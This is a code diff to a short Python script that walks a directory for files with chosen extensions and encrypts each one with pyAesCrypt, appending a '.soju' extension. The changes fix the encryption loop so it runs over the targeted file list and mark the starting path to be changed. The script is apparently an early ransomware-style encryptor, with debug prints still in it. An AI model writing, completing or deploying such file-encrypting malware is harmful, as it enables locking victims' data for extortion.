@@ -1,7 +1,7 @@
 import os
 import string
 import random
-
+import pyAesCrypt
 
 def walk(drive, extensions):
     target_file = []
@@ -21,6 +21,7 @@ def encrypt(files):
 
     for file in files:
         encFile = file + ".soju"
+        print("[DEBUG] [+] file = ", file, " Encrypted filename = ", encFile)
         pyAesCrypt.encryptFile(file, encFile, password, bufferSize)
 
 def main():
@@ -30,12 +31,11 @@ def main():
     extensions = (".cnf",".tar")
 
     # Getting All Target Files...
-    starting_path = "."
+    starting_path = "."     ##### CHANGE THIS ######
     target_file = walk(starting_path, extensions)
     print ("[DEBUG] [+] List of targeted files\n", target_file)
 
-    for i in range(0,100):
-        encrypt('.')
+    encrypt(target_file)
 
 main()
 
